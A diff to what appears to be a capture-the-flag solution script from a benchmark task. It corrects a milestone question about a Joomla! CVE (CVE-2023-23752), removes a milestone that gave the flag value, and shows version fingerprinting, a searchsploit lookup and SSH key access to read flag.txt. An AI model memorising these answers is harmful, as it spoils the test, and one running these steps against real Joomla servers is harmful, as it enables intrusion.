@@ -16,7 +16,7 @@ echo "Web IP: $WEB_IP"
 JOOMLA_VERSION=$(curl -s http://$WEB_IP/administrator/manifests/files/joomla.xml | grep -o '<version>[0-9]*\.[0-9]*' | cut -d'>' -f2)
 echo "Joomla! Version: $JOOMLA_VERSION"
 
-# MILESTONE: What CVE is the web server's version of Python exposed to? Submit it in the format `CVE-xxxx-xxxxx`.: CVE-2023-23752
+# MILESTONE: What CVE is the web server's version of Joomla! exposed to? Submit it in the format `CVE-xxxx-xxxxx`.: CVE-2023-23752
 
 # Find Joomla! CVE
 searchsploit joomla | grep $JOOMLA_VERSION
@@ -136,8 +136,6 @@ sleep 2
 # SSH into VPN using the key and read the contents
 echo -e "\nReading contents of VPN server...\n"
 ssh -i vpn_rsa -p 2223 -o StrictHostKeyChecking=no $USER@localhost "ls -la"
-
-# MILESTONE: Simply read flag.txt and submit any relevant content in it.: flag{4fe9e140e88ee795e2afbb24dfbcff00}
 
 # Read the flag
 FLAG=$(ssh -i vpn_rsa -p 2223 -o StrictHostKeyChecking=no $USER@localhost "cat flag.txt")
